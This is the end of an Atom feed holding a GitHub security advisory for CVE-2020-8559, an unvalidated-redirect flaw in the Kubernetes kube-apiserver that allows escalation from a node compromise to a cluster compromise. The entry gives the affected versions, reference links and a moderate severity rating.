        <id>https://github.com/advisories/GHSA-33c5-9fx5-fvjm</id>
        <link href="https://github.com/advisories/GHSA-33c5-9fx5-fvjm"/>
        <updated>2024-05-07T13:08:06.000Z</updated>
        <content type="html"><![CDATA[<p>The Kubernetes kube-apiserver in versions v1.6-v1.15, and versions prior to v1.16.13, v1.17.9 and v1.18.7 are vulnerable to an unvalidated redirect on proxied upgrade requests that could allow an attacker to escalate privileges from a node compromise to a full cluster compromise.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8559">https://nvd.nist.gov/vuln/detail/CVE-2020-8559</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/92914">https://github.com/kubernetes/kubernetes/issues/92914</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/92941">https://github.com/kubernetes/kubernetes/pull/92941</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1851422">https://bugzilla.redhat.com/show_bug.cgi?id=1851422</a></li>
<li><a href="https://github.com/tdwyer/CVE-2020-8559">https://github.com/tdwyer/CVE-2020-8559</a></li>
<li><a href="https://groups.google.com/d/msg/kubernetes-security-announce/JAIGG5yNROs/19nHQ5wkBwAJ">https://groups.google.com/d/msg/kubernetes-security-announce/JAIGG5yNROs/19nHQ5wkBwAJ</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/JAIGG5yNROs">https://groups.google.com/g/kubernetes-security-announce/c/JAIGG5yNROs</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20200810-0004">https://security.netapp.com/advisory/ntap-20200810-0004</a></li>
<li><a href="https://github.com/advisories/GHSA-33c5-9fx5-fvjm">https://github.com/advisories/GHSA-33c5-9fx5-fvjm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33c5-9fx5-fvjm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-24T20:01:22.000Z</published>
    </entry>
</feed>